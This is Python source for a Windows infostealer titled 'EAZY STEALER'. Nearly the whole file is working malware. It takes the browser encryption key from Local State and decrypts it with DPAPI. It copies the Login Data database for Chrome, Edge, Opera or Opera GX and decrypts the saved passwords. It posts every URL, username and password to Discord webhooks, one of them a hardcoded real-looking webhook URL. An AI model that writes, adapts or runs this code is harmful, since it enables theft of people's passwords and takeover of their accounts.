# # EAZY STEALER - MADE BY SIFE # #

import webbrowser
from discord_webhook import DiscordWebhook
import os 
import win32crypt
from getmac import get_mac_address
import socket
import json
import sqlite3 
import shutil 
from Cryptodome.Cipher import AES 
import base64 
import winreg
import time



secondary_hook = "https://discord.com/api/webhooks/1311518648380293270/wTLidZG0TXPYAhd1DjkE6E9MTIVKFwjLl9DHn9ZTMoyLxAsTSZU2QuHXYqH5SuB_gzy4"
webhook_url = ""
default = webbrowser.get()
browser_name = default.name.split("/")[-1].split(".")[0]
hostname = socket.gethostname()




inject, inject2 = DiscordWebhook.create_batch(urls=[webhook_url, secondary_hook], content="**------------INJECTION STARTED------------**")

inject.execute()

inject2.execute()


# ip/mac grabbing
def grabbing():
    ip = socket.gethostbyname(hostname)
    mac = get_mac_address()


# getting default browser
def get_default_browser():
    try:
        with winreg.OpenKey(winreg.HKEY_CURRENT_USER, r'Software\Microsoft\Windows\Shell\Associations\UrlAssociations\http\UserChoice') as key:
            prog_id = winreg.QueryValueEx(key, 'ProgId')[0]
        
        browser_map = {
            'ChromeHTML': 'Google Chrome',
            'MSEdgeHTM': 'Microsoft Edge',
            'OperaStable': 'Opera',
            'Opera GXStable': 'Opera GX'   
        }
        return browser_map.get(prog_id, 'Unknown Browser')
    except Exception as e:
        return f"An error occurred: {e}"
  
# chrome encryption key
def chrome_key(): 
    local_computer_directory_path = os.path.join( 
      os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "Local State") 
      
    with open(local_computer_directory_path, "r", encoding="utf-8") as f: 
        local_state_data = f.read() 
        local_state_data = json.loads(local_state_data) 
  
    encryption_key = base64.b64decode( 
      local_state_data["os_crypt"]["encrypted_key"]) 
    encryption_key = encryption_key[5:]
    
    return win32crypt.CryptUnprotectData(encryption_key, None, None, None, 0)[1] 
# edge encryption key
def edge_key(): 
    local_computer_directory_path = os.path.join( 
      os.environ["USERPROFILE"], "AppData", "Local", "Microsoft", "Edge", 
      "User Data", "Local State") 
      
    with open(local_computer_directory_path, "r", encoding="utf-8") as f: 
        local_state_data = f.read() 
        local_state_data = json.loads(local_state_data) 
  
    encryption_key = base64.b64decode( 
      local_state_data["os_crypt"]["encrypted_key"]) 
    encryption_key = encryption_key[5:]
    return win32crypt.CryptUnprotectData(encryption_key, None, None, None, 0)[1] 

# opera encryption key
def opera_key(): 
    local_computer_directory_path = os.path.join( 
      os.environ["USERPROFILE"], "AppData", "Roaming", "Opera Software", "Opera Stable", "Local State") 
      
    with open(local_computer_directory_path, "r", encoding="utf-8") as f: 
        local_state_data = f.read() 
        local_state_data = json.loads(local_state_data) 
  
    encryption_key = base64.b64decode( 
      local_state_data["os_crypt"]["encrypted_key"]) 
    encryption_key = encryption_key[5:]
    return win32crypt.CryptUnprotectData(encryption_key, None, None, None, 0)[1] 

def operagx_key(): 
    local_computer_directory_path = os.path.join( 
      os.environ["USERPROFILE"], "AppData", "Roaming", "Opera Software", "Opera GX Stable", "Local State") 
      
    with open(local_computer_directory_path, "r", encoding="utf-8") as f: 
        local_state_data = f.read() 
        local_state_data = json.loads(local_state_data) 
  
    encryption_key = base64.b64decode( 
      local_state_data["os_crypt"]["encrypted_key"]) 
    encryption_key = encryption_key[5:]
    return win32crypt.CryptUnprotectData(encryption_key, None, None, None, 0)[1] 

# decrypting passwords
def password_decryption(password, encryption_key): 
    try: 
        iv = password[3:15] 
        password = password[15:] 
        cipher = AES.new(encryption_key, AES.MODE_GCM, iv) 
        return cipher.decrypt(password)[:-16].decode() 
    except: 
        try: 
            return str(win32crypt.CryptUnprotectData(password, None, None, None, 0)[1]) 
        except: 
            return "No Passwords"

      

def chromemain():
    key = chrome_key()
    db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "default", "Login Data")
    filename = "ChromePasswords.db"
    shutil.copyfile(db_path, filename)

    db = sqlite3.connect(filename)
    cursor = db.cursor()

    cursor.execute(
        "SELECT origin_url, action_url, username_value, password_value, date_created, date_last_used FROM logins "
        "ORDER BY date_last_used"
    )

    rows = cursor.fetchall()

    for row in rows:
        main_url = row[0]
        login_page_url = row[1]
        user_name = row[2]
        decrypted_password = password_decryption(row[3], key)
        date_of_creation = row[4]
        last_usage = row[5]

        if user_name or decrypted_password:
            firstline1, firstline2 = DiscordWebhook.create_batch(urls=[webhook_url, secondary_hook], content="----------------------------------------------")

            webhook1, webhook2 = DiscordWebhook.create_batch(urls=[webhook_url, secondary_hook], content=f"URL: `{main_url}`")
            webhook3, webhook4 = DiscordWebhook.create_batch(urls=[webhook_url, secondary_hook], content=f"Username: {user_name}")
            webhook5, webhook6 = DiscordWebhook.create_batch(urls=[webhook_url, secondary_hook], content=f"Decrypted Password: {decrypted_password}")
            
            firstline1.execute()
            time.sleep(1)
            webhook1.execute()
            webhook2.execute()
            time.sleep(1)
            webhook3.execute()
            webhook4.execute()
            time.sleep(1)
            webhook5.execute()
            webhook6.execute()
            time.sleep(1)


def edgemain():
    key = edge_key()
    db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Microsoft", "Edge", "User Data", "default", "Login Data") 
    filename = "EdgePasswords.db"
    shutil.copyfile(db_path, filename)

    db = sqlite3.connect(filename)
    cursor = db.cursor()

    cursor.execute(
        "SELECT origin_url, action_url, username_value, password_value, date_created, date_last_used FROM logins "
        "ORDER BY date_last_used"
    )

    rows = cursor.fetchall()

    for row in rows:
        main_url = row[0]
        login_page_url = row[1]
        user_name = row[2]
        decrypted_password = password_decryption(row[3], key)
        date_of_creation = row[4]
        last_usage = row[5]

        if user_name or decrypted_password:
            firstline1, firstline2 = DiscordWebhook.create_batch(urls=[webhook_url, secondary_hook], content="----------------------------------------------")

            webhook1, webhook2 = DiscordWebhook.create_batch(urls=[webhook_url, secondary_hook], content=f"URL: `{main_url}`")
            webhook3, webhook4 = DiscordWebhook.create_batch(urls=[webhook_url, secondary_hook], content=f"Username: {user_name}")
            webhook5, webhook6 = DiscordWebhook.create_batch(urls=[webhook_url, secondary_hook], content=f"Decrypted Password: {decrypted_password}")
            
            firstline1.execute()
            time.sleep(1)
            webhook1.execute()
            webhook2.execute()
            time.sleep(1)
            webhook3.execute()
            webhook4.execute()
            time.sleep(1)
            webhook5.execute()
            webhook6.execute()
            time.sleep(1)


def operamain():
    key = opera_key()
    db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Roaming", "Opera Software", "Opera Stable", "Default", "Login Data") 
    filename = "OperaPasswords.db"
    shutil.copyfile(db_path, filename)

    db = sqlite3.connect(filename)
    cursor = db.cursor()

    cursor.execute(
        "SELECT origin_url, action_url, username_value, password_value, date_created, date_last_used FROM logins "
        "ORDER BY date_last_used"
    )

    rows = cursor.fetchall()

    for row in rows:
        main_url = row[0]
        login_page_url = row[1]
        user_name = row[2]
        decrypted_password = password_decryption(row[3], key)
        date_of_creation = row[4]
        last_usage = row[5]

        if user_name or decrypted_password:   
            firstline1, firstline2 = DiscordWebhook.create_batch(urls=[webhook_url, secondary_hook], content="----------------------------------------------")

            webhook1, webhook2 = DiscordWebhook.create_batch(urls=[webhook_url, secondary_hook], content=f"URL: `{main_url}`")
            webhook3, webhook4 = DiscordWebhook.create_batch(urls=[webhook_url, secondary_hook], content=f"Username: {user_name}")
            webhook5, webhook6 = DiscordWebhook.create_batch(urls=[webhook_url, secondary_hook], content=f"Decrypted Password: {decrypted_password}")
            
            firstline1.execute()
            time.sleep(1)
            webhook1.execute()
            webhook2.execute()
            time.sleep(1)
            webhook3.execute()
            webhook4.execute()
            time.sleep(1)
            webhook5.execute()
            webhook6.execute()
            time.sleep(1)

def operagxmain():
    key = operagx_key()
    db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Roaming", "Opera Software", "Opera GX Stable", "Login Data") 
    filename = "OperaGXPasswords.db"
    shutil.copyfile(db_path, filename)

    db = sqlite3.connect(filename)
    cursor = db.cursor()

    cursor.execute(
        "SELECT origin_url, action_url, username_value, password_value, date_created, date_last_used FROM logins "
        "ORDER BY date_last_used"
    )

    rows = cursor.fetchall()

    for row in rows:
        main_url = row[0]
        login_page_url = row[1]
        user_name = row[2]
        decrypted_password = password_decryption(row[3], key)
        date_of_creation = row[4]
        last_usage = row[5]

        if user_name or decrypted_password:   
            firstline1, firstline2 = DiscordWebhook.create_batch(urls=[webhook_url, secondary_hook], content="----------------------------------------------")

            webhook1, webhook2 = DiscordWebhook.create_batch(urls=[webhook_url, secondary_hook], content=f"URL: `{main_url}`")
            webhook3, webhook4 = DiscordWebhook.create_batch(urls=[webhook_url, secondary_hook], content=f"Username: {user_name}")
            webhook5, webhook6 = DiscordWebhook.create_batch(urls=[webhook_url, secondary_hook], content=f"Decrypted Password: {decrypted_password}")
            
            firstline1.execute()
            time.sleep(1)
            webhook1.execute()
            webhook2.execute()
            time.sleep(1)
            webhook3.execute()
            webhook4.execute()
            time.sleep(1)
            webhook5.execute()
            webhook6.execute()
            time.sleep(1)


            

if __name__ == "__main__": 
    defaultbrowser = get_default_browser()
    if defaultbrowser == "Opera":
        operamain()
    if defaultbrowser == "Microsoft Edge":
        edgemain()
    if defaultbrowser == "Opera GX":
        operagxmain()
    if defaultbrowser == "Google Chrome":
        chromemain()

